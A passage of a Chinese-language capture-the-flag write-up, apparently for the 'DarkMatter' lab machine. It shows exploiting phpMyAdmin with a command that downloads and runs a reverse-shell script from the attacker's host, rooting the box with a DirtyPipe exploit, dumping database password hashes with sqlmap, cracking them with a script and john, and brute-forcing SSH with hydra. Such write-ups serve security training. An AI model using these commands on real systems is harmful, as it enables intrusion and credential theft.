-rwxr-xr-x 1 www-data www-data 6427 Nov 14  2021 blog.php
-rwxr-xr-x 1 www-data www-data  319 Nov 14  2021 conn.php
drwxr-xr-x 2 www-data www-data 4096 Nov 14  2021 css
-rwxr-xr-x 1 www-data www-data  350 Nov 14  2021 footer.php
-rwxr-xr-x 1 www-data www-data  272 Nov 14  2021 header.php
-rwxr-xr-x 1 www-data www-data 2464 Nov 14  2021 home.php
drwxr-xr-x 2 www-data www-data 4096 Nov 14  2021 images
-rwxr-xr-x 1 www-data www-data  476 Nov 14  2021 index.php
drwxr-xr-x 2 www-data www-data 4096 Nov 14  2021 js
-rwxr-xr-x 1 www-data www-data 3416 Nov 21  2021 login.php
-rwxr-xr-x 1 www-data www-data  108 Nov 14  2021 logout.php
-rwxr-xr-x 1 www-data www-data 1669 Nov 14  2021 manage.php
-rwxr-xr-x 1 www-data www-data 3265 Nov 14  2021 navbar.php
-rwxr-xr-x 1 www-data www-data 2854 Nov 14  2021 profile.php
-rwxr-x--x 1 www-data www-data 6315 Nov 21  2021 register.php
-rwxr-xr-x 1 www-data www-data  607 Nov 14  2021 status.php
-rwxr-xr-x 1 www-data www-data 6172 Nov 14  2021 update.php
drwxr-xr-x 2 www-data www-data 4096 Nov 14  2021 upload
(remote) www-data@DarkMatter:/tmp/darkmatter$ cat conn.php
<?php
    // connection vars
    $hname = "127.0.0.1";
    $uname = "pam";
    $upass = "th3-!llum!n@t0r";
    $dbname = "mysql";

    // create conn
    $conn = mysqli_connect($hname, $uname, $upass, $dbname);

    // check conn
    if (!$conn) {
        die("Connection failed : " . mysqli_connect_error());
    }
?>

(remote) www-data@DarkMatter:/tmp/darkmatter$ cat profile.php
.........
<!--
DarkMatter's All Power is here ^(#｀∀ ´)_Ψ
<?xml version="1.0" encoding="utf-8"?>
<KeyFile>
        <Meta>
                <Version>2.0</Version>
        </Meta>
        <Key>
                <Data Hash="180EC55B">
                        AE9AEE5F 228C56A6 42D81928 59EF70B8
                        1A9468F9 C7FA509E 6A290BE5 60111681
                </Data>
        </Key>
</KeyFile>
-->
.........

(remote) www-data@DarkMatter:/tmp/darkmatter$ cat register.php
.........
if ($_POST['vpassword'] == $password) {
            // don't forget to "rev" your password after cracking hash
            $vpassword = sha1(md5("s3cr37" . $password . "p4ssw0rd"));
        } 
.........
(remote) www-data@DarkMatter:/tmp/darkmatter$ cd upload/
(remote) www-data@DarkMatter:/tmp/darkmatter/upload$ ls -la
total 1376
drwxr-xr-x 2 www-data www-data    4096 Nov 14  2021 .
drwxr-x--x 6 www-data www-data    4096 Nov 21  2021 ..
-rwxr-xr-x 1 www-data www-data   50193 Nov 14  2021 dp.jpg
-rwxr-xr-x 1 www-data www-data 1345261 Nov 14  2021 dp.jpg.bak
```

### 探索

看一下是否有隐藏信息：

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ exiftool dp.jpg
ExifTool Version Number         : 12.23
File Name                       : dp.jpg
Directory                       : .
File Size                       : 49 KiB
File Modification Date/Time     : 2024:08:07 23:17:30-04:00
File Access Date/Time           : 2024:08:07 23:18:19-04:00
File Inode Change Date/Time     : 2024:08:07 23:17:30-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Profile CMM Type                : Little CMS
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2012:01:25 03:41:57
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : c2
Profile Copyright               : FB
Media White Point               : 0.9642 1 0.82491
Media Black Point               : 0.01205 0.0125 0.01031
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
Image Width                     : 959
Image Height                    : 640
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 959x640
Megapixels                      : 0.614

┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ binwalk dp.jpg           

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ binwalk dp.jpg.bak 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 3840 x 2160, 8-bit/color RGBA, non-interlaced
159           0x9F            Zlib compressed data, best compression
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408090859085.png" alt="image-20240808112612042" style="zoom: 50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408090859086.png" alt="image-20240808112554465" style="zoom:50%;" />

都是师傅常用的图，绝对有猫腻，重命名仔细看看：

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ exiftool dpb.jpg
ExifTool Version Number         : 12.23
File Name                       : dpb.jpg
Directory                       : .
File Size                       : 1314 KiB
File Modification Date/Time     : 2024:08:07 23:18:46-04:00
File Access Date/Time           : 2024:08:07 23:25:35-04:00
File Inode Change Date/Time     : 2024:08:07 23:25:35-04:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 3840
Image Height                    : 2160
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Gamma                           : 2.2
White Point X                   : 0.3127
White Point Y                   : 0.329
Red X                           : 0.64
Red Y                           : 0.33
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.06
Background Color                : 0 0 0
Pixels Per Unit X               : 3780
Pixels Per Unit Y               : 3780
Pixel Units                     : meters
Modify Date                     : 2019:01:24 21:41:18
Warning                         : [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)
Datecreate                      : 2019-01-24T21:41:18-08:00
Datemodify                      : 2019-01-24T21:41:18-08:00
Image Size                      : 3840x2160
Megapixels                      : 8.3
```

嘶。。。。。这图除了好看也没啥，溜。。。。

```bash
python3 50457.py $IP 80 /phpmyadmin pam 'th3-!llum!n@t0r' 'cd /tmp;wget http://192.168.10.101:8888/revshell.php;chmod +x revshell.php;php revshell.php'
```

后面换了一个网络，作弊进去看了一下：https://github.com/n3rada/DirtyPipe

```bash
(remote) www-data@DarkMatter:/tmp$ ./dpipe 
Usage:
  ./dpipe [--no-backup] [--root]
  ./dpipe [--no-backup] <file_path> <offset> <data>

Options:
  --no-backup  Do not create a backup of the file before writing.
  --root        Apply root exploit on /etc/passwd.
(remote) www-data@DarkMatter:/tmp$ ./dpipe --root
[Dirty Pipe] Attempting to backup '/etc/passwd' to '/tmp/passwd.bak'
[Dirty Pipe] Successfully backed up '/etc/passwd' to '/tmp/passwd.bak'
[Dirty Pipe] Initiating write to '/etc/passwd'...
[Dirty Pipe] Data size to write: 131 bytes
[Dirty Pipe] File '/etc/passwd' opened successfully for reading.
[Dirty Pipe] Pipe size determined: 65536 bytes
[Dirty Pipe] Filling the pipe...
[Dirty Pipe] Pipe filled successfully.
[Dirty Pipe] Draining the pipe...
[Dirty Pipe] Pipe drained successfully.
[Dirty Pipe] Data successfully written to '/etc/passwd'.
[Dirty Pipe] You can connect as root with password 'el3ph@nt!'
[Dirty Pipe] Program execution completed successfully.
(remote) www-data@DarkMatter:/tmp$ su - root
Password: 
# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
# cat impo*
A great website isn't run by a normal user, but by a great administrator
                                                            - daarkmatter
```

### sql 数据二次探索

嘶。。。。然后又杀回sql数据库了，我还以为用不上了，那里用户信息没搞完：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408090859087.png" alt="image-20240808232412742" style="zoom:50%;" />

```bash
# sqlmap -u "http://dark.darkmatter.hmv/update.php?id=5" --cookie "PHPSESSID=8i7j0lmbqs67u6b77mh7or3ub9" --batch -D mysql --tables
+---------------------------+
| event                     |
| plugin                    |
| user                      |
| column_stats              |
| columns_priv              |
| db                        |
| details                   |
| func                      |
| general_log               |
| global_priv               |
| gtid_slave_pos            |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| index_stats               |
| innodb_index_stats        |
| innodb_table_stats        |
| proc                      |
| procs_priv                |
| proxies_priv              |
| roles_mapping             |
| servers                   |
| slow_log                  |
| table_stats               |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| transaction_registry      |
+---------------------------+

# sqlmap -u "http://dark.darkmatter.hmv/update.php?id=5" --cookie "PHPSESSID=8i7j0lmbqs67u6b77mh7or3ub9" --batch -D mysql -T user --columns
+------------------------+---------------------+
| Column                 | Type                |
+------------------------+---------------------+
| Host                   | char(60)            |
| max_user_connections   | bigint(21)          |
| plugin                 | longtext            |
| User                   | char(80)            |
| Alter_priv             | varchar(1)          |
| Alter_routine_priv     | varchar(1)          |
| authentication_string  | longtext            |
| Create_priv            | varchar(1)          |
| Create_routine_priv    | varchar(1)          |
| Create_tablespace_priv | varchar(1)          |
| Create_tmp_table_priv  | varchar(1)          |
| Create_user_priv       | varchar(1)          |
| Create_view_priv       | varchar(1)          |
| default_role           | longtext            |
| Delete_history_priv    | varchar(1)          |
| Delete_priv            | varchar(1)          |
| Drop_priv              | varchar(1)          |
| Event_priv             | varchar(1)          |
| Execute_priv           | varchar(1)          |
| File_priv              | varchar(1)          |
| Grant_priv             | varchar(1)          |
| Index_priv             | varchar(1)          |
| Insert_priv            | varchar(1)          |
| is_role                | varchar(1)          |
| Lock_tables_priv       | varchar(1)          |
| max_connections        | bigint(20) unsigned |
| max_questions          | bigint(20) unsigned |
| max_statement_time     | decimal(12,6)       |
| max_updates            | bigint(20) unsigned |
| Password               | longtext            |
| password_expired       | varchar(1)          |
| Process_priv           | varchar(1)          |
| References_priv        | varchar(1)          |
| Reload_priv            | varchar(1)          |
| Repl_client_priv       | varchar(1)          |
| Repl_slave_priv        | varchar(1)          |
| Select_priv            | varchar(1)          |
| Show_db_priv           | varchar(1)          |
| Show_view_priv         | varchar(1)          |
| Shutdown_priv          | varchar(1)          |
| ssl_cipher             | longtext            |
| ssl_type               | varchar(9)          |
| Super_priv             | varchar(1)          |
| Trigger_priv           | varchar(1)          |
| Update_priv            | varchar(1)          |
| x509_issuer            | longtext            |
| x509_subject           | longtext            |
+------------------------+---------------------+

# sqlmap -u "http://dark.darkmatter.hmv/update.php?id=5" --cookie "PHPSESSID=8i7j0lmbqs67u6b77mh7or3ub9" --batch -D mysql -T user -C User,Password --dump
+-------------+-------------------------------------------+
| User        | Password                                  |
+-------------+-------------------------------------------+
| mariadb.sys | <blank>                                   |
| mysql       | invalid                                   |
| pma         | *BEEB4E851E26AFD599E4AB301C8ABFA703189474 |
| avijneyam   | *B9F4AA0650E1146EA39CA7CBD3053094D9FD23CB |
| pam         | *BEEB4E851E26AFD599E4AB301C8ABFA703189474 |
+-------------+-------------------------------------------+

# sqlmap -u "http://dark.darkmatter.hmv/update.php?id=5" --cookie "PHPSESSID=8i7j0lmbqs67u6b77mh7or3ub9" --batch -D mysql --tables --dump
......
Database: mysql
Table: details
[5 entries]
+----+---------------------------+-------------------+---------+------------------------------------------+--------------+
| id | email                     | name              | admin   | password                                 | username     |
+----+---------------------------+-------------------+---------+------------------------------------------+--------------+
| 1  | testing123@hackmyvm.hmv   | Testing123        | 0       | testing123                               | testing123   |
| 2  | darkenergy@hackmyvm.hmv   | DarkEnergy        | 1       | 5ab1ac652fa9852b1cf84ef7ef9a89d37455481b | darkenergy   |
| 3  | testing12345@hackmyvm.hmv | TestingAgain12345 | 0       | testing12345                             | testing12345 |
| 4  | hello@hello.hmv           | hello             | 0       | fce65e896ce65ce163f920862b51829f55fe1e8f | hello        |
| 5  | whoami@darkmatter.hmv     | username          | 0       | 090d3016379302e5195b1213966f01424a66eeaa | username     |
+----+---------------------------+-------------------+---------+------------------------------------------+--------------+
......
```

### hash碰撞

结合前面的那一段密码：

```php
if ($_POST['vpassword'] == $password) {
    // don't forget to "rev" your password after cracking hash
    $vpassword = sha1(md5("s3cr37" . $password . "p4ssw0rd"));
}
```

看一下啥情况，尝试写个脚本进行猜解：

```python
import hashlib
import os

# 给定的vpassword值
vpassword = "5ab1ac652fa9852b1cf84ef7ef9a89d37455481b"

# 读取rockyou.txt文件并尝试破解密码
def crack_password(vpassword):
    with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as file:
        for line in file:
            password = line.strip()
            # 使用相同的哈希算法
            hashed_password = hashlib.sha1(hashlib.md5(("s3cr37" + password + "p4ssw0rd").encode()).hexdigest().encode()).hexdigest()
            
            if hashed_password == vpassword:
                print(f"[+] PASSWORD -> {password}")
                return password
        print("[-] NO FOUND....")
        return None

# 运行函数
crack_password(vpassword)
```

运行得到答案：

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ python3 exp.py
[+] PASSWORD -> d4rk(4ng3l)
```

颠倒一下，然后尝试进行登录：

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ echo -n 'd4rk(4ng3l)' | rev                                                   
)l3gn4(kr4d
```

尝试切换用户：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408090859088.png" alt="image-20240809000838388" style="zoom: 50%;" />

拿下用户

### 破解密码(失败)

```bash
darkenergy@DarkMatter:~$ sudo -l
[sudo] password for darkenergy: 
Sorry, user darkenergy may not run sudo on DarkMatter.
darkenergy@DarkMatter:~$ ls -la
total 36
drwx------ 3 darkenergy darkenergy 4096 Nov 21  2021 .
drwxr-xr-x 3 root       root       4096 Nov 10  2021 ..
lrwxrwxrwx 1 root       root          9 Nov 14  2021 .bash_history -> /dev/null
-rw-r--r-- 1 darkenergy darkenergy  220 Nov 10  2021 .bash_logout
-rw-r--r-- 1 darkenergy darkenergy 3526 Nov 10  2021 .bashrc
drwxr-xr-x 3 darkenergy darkenergy 4096 Nov 10  2021 .local
-rw-r--r-- 1 darkenergy darkenergy  807 Nov 10  2021 .profile
-rw-r--r-- 1 root       root         99 Nov 14  2021 .secretNote.kdbx
-rw-r--r-- 1 root       root       2222 Nov 14  2021 secretPass.kdbx
-r-------- 1 darkenergy darkenergy   33 Nov 14  2021 userFlag.txt
darkenergy@DarkMatter:~$ cat userFlag.txt
4811162d4b5326c7432d29429ca6491b
darkenergy@DarkMatter:~$ cat .secretNote.kdbx
No one can find that
                   - Root
       


#Evil_Laugh hahahahhahahahhahahahahahahha
darkenergy@DarkMatter:~$ file secretPass.kdbx
secretPass.kdbx: Keepass password database 2.x KDBX
```

下载到本地看一下：

```bash
# darkenergy
darkenergy@DarkMatter:~$ python3 -V
Python 3.9.2
darkenergy@DarkMatter:~$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
192.168.10.101 - - [08/Aug/2024 12:13:34] "GET /.secretNote.kdbx HTTP/1.1" 200 -
192.168.10.101 - - [08/Aug/2024 12:13:42] "GET /secretPass.kdbx HTTP/1.1" 200 -

# kali
# wget http://192.168.10.106:8888/.secretNote.kdbx
# wget http://192.168.10.106:8888/secretPass.kdbx
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ stegsnow -C .secretNote.kdbx                                                                                   

┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ ls                          
50457.py  dpb.jpg  dp.jpg  _dp.jpg.bak.extracted  exp.py  hash  secretPass.kdbx

┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ keepass2john secretPass.kdbx > secretPass.hash

┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ cat secretPass.hash
secretPass:$keepass$*2*60000*0*cda329545d735c0f91bd8ce384e059e2dfa82c32c064bb28dca519cd79a9ba47*fcc36a57e7b0bcd99f96df7691ea76662e31200428feedde9eab313e023baf33*a8b33ad9e6f92bc6971e771107dcfe14*137e703f091372a9da08a1b791dbea8ad07aded945534d992d36468551266785*c899b439d77c73e98402a6d7ca21887767c3c26f89bc236a4c7a8d511b0f26ce

┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt secretPass.hash         
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:56 0.12% (ETA: 2024-08-10 05:34) 0g/s 116.0p/s 116.0c/s 116.0C/s monkeys2..michelle4
Session aborted
```

尝试自定义字典进行爆破：

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ cat dic                                              
No
one
can
find
that$
that
-
Root$
Root
$
#Evil_Laugh
Evil_Laugh
hahahahhahahahhahahahahahahha$
hahahahhahahahhahahahahahahha
```

没爆破出来，尝试一下其他的，看看是不是有离谱的地方。

```bash
darkenergy@DarkMatter:~$ sudo -l
[sudo] password for darkenergy: 
Sorry, user darkenergy may not run sudo on DarkMatter.
darkenergy@DarkMatter:~$ cat /etc/sudoers.d/darkenergy
darkenergy rettaMkraD = (root) NOPASSWD: /bin/bash
darkenergy@DarkMatter:~$ sudo /bin/bash
[sudo] password for darkenergy: 
darkenergy is not allowed to run sudo on DarkMatter.  This incident will be reported.
darkenergy@DarkMatter:~$ ls -la /etc/sudoers.d/darkenergy
-rw-r--r-- 1 root root 51 Nov 11  2021 /etc/sudoers.d/darkenergy
darkenergy@DarkMatter:~$ ls -la /etc/shadow
-rw-r----- 1 root shadow 1013 Nov 21  2021 /etc/shadow
```

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ python3 exp.py             
[+] PASSWORD -> hello

┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ cat exp.py | grep fce  
vpassword = "fce65e896ce65ce163f920862b51829f55fe1e8f"
```

没啥收获。。。。突然想起前面那个网站有个key。。。。

```bash
<!--
DarkMatter's All Power is here ^(#｀∀ ´)_Ψ
<?xml version="1.0" encoding="utf-8"?>
<KeyFile>
        <Meta>
                <Version>2.0</Version>
        </Meta>
        <Key>
                <Data Hash="180EC55B">
                        AE9AEE5F 228C56A6 42D81928 59EF70B8
                        1A9468F9 C7FA509E 6A290BE5 60111681
                </Data>
        </Key>
</KeyFile>
-->
```

放到一个文件，尝试解密：

```bash
(remote) www-data@DarkMatter:/tmp$ cat key.xml 
<?xml version="1.0" encoding="utf-8"?>
<KeyFile>
        <Meta>
                <Version>2.0</Version>
        </Meta>
        <Key>
                <Data Hash="180EC55B">
                        AE9AEE5F 228C56A6 42D81928 59EF70B8
                        1A9468F9 C7FA509E 6A290BE5 60111681
                </Data>
        </Key>
</KeyFile>
```

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ hash-identifier 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: AE9AEE5F228C56A642D8192859EF70B81A9468F9C7FA509E6A290BE560111681

Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
--------------------------------------------------
 HASH: ^C

        Bye!
```

试了很多，但是没能成功。

### sudoers提权root

之前的`sudoers`我一直以为是被恶意污染了

```bash
darkenergy@DarkMatter:~$ cat /etc/sudoers.d/darkenergy
darkenergy rettaMkraD = (root) NOPASSWD: /bin/bash
```

但是实际上却是正确方向，看一下文档：

```bash
# This fixes CVE‐2005‐4890 and possibly breaks some  versions  of
kdesu  #  (#1011624, https://bugs.kde.org/show_bug.cgi?id=452532)
Defaults        use_pty
# This preserves proxy settings from user environments of root  #
equivalent   users   (group  sudo)  #Defaults:%sudo  env_keep  +=
"http_proxy https_proxy ftp_proxy all_proxy no_proxy"
# This allows running arbitrary commands, but so does ALL, and it
means # different sudoers have their choice of editor  respected.
#Defaults:%sudo env_keep += "EDITOR"
#  Completely  harmless  preservation of a user preference.  #De‐
faults:%sudo env_keep += "GREP_COLOR"
# While you shouldn’t normally run git as root, you need to  with
etckeeper  #Defaults:%sudo  env_keep += "GIT_AUTHOR_* GIT_COMMIT‐
TER_*"
# Per‐user preferences; root won’t have sensible values for them.
#Defaults:%sudo env_keep += "EMAIL DEBEMAIL DEBFULLNAME"
# "sudo scp" or "sudo rsync" should  be  able  to  use  your  SSH
agent.  #Defaults:%sudo env_keep += "SSH_AGENT_PID SSH_AUTH_SOCK"
#    Ditto    for   GPG   agent   #Defaults:%sudo   env_keep   +=
"GPG_AGENT_INFO"
# Host alias specification             <-关键。。。。。
# User alias specification
# Cmnd alias specification
# User privilege specification root    ALL=(ALL:ALL) ALL
#  Allow  members  of  group  sudo   to   execute   any   command
%sudo   ALL=(ALL:ALL) ALL
# See sudoers(5) for more information on "@include" directives:
@includedir /etc/sudoers.d
```

再看一下sudo的文档：

```bash
NAME
       sudo, sudoedit — execute a command as another user

SYNOPSIS
       sudo -h | -K | -k | -V
       sudo -v [-ABkNnS] [-g group] [-h host] [-p prompt] [-u user]
       sudo -l [-ABkNnS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command [arg ...]]
       sudo [-ABbEHnPS] [-C num] [-D directory] [-g group] [-h host] [-p prompt] [-R directory] [-r role] [-t type] [-T timeout] [-u user] [VAR=value] [-i | -s] [command [arg ...]]
       sudoedit [-ABkNnS] [-C num] [-D directory] [-g group] [-h host] [-p prompt] [-R directory] [-r role] [-t type] [-T timeout] [-u user] file ...
.............
-h host, --host=host
    Run the command on the specified host if the security policy plugin supports remote commands. The sudoers plugin does not currently support running remote commands. This may also be used in conjunction with the -l option to list a user's privileges for the remote host.
.............
```

所以之前我们只找了`rettaMkraD`不在用户和组内，结果这是一个域名特权。。。。尝试进行提权：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408090859089.png" alt="image-20240809085837351" style="zoom: 50%;" />

完毕！撒花:cherry_blossom:！lol！

## 小彩蛋

`dirtypipe`进去拿下`shadow`发现`www-data`有密码，常规是没密码的。。。

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ grep -P '^dark' /usr/share/wordlists/rockyou.txt > temp

┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ hydra -l www-data -P temp ssh://192.168.10.106         
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-08 13:18:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 5428 login tries (l:1/p:5428), ~340 tries per task
[DATA] attacking ssh://192.168.10.106:22/
[22][ssh] host: 192.168.10.106   login: www-data   password: darkstar
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-08 13:18:29
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408090859090.png" alt="image-20240809012130535" style="zoom:33%;" />

```bash
(remote) www-data@DarkMatter:/$ sudo -u root /usr/bin/cat /root/important.txt > /tmp/important.txt
(remote) www-data@DarkMatter:/$ cat -A /tmp/important.txt
A great website isn't run by a normal user, but by a great administrator$
                                                            - daarkmatter$
```

## 参考

https://www.bilibili.com/video/BV1uz421k7CA/